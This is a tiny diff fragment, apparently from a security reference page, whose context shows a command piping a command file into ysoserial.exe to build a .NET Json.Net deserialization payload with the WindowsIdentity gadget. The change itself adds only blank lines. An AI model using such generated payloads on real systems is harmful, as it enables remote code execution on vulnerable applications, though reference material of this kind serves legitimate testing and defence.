@@ -15,3 +15,5 @@ updated_at: '2023-04-06T03:55:59.103406+00:00'
 ```bash
 $ cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s
 ```
+
+
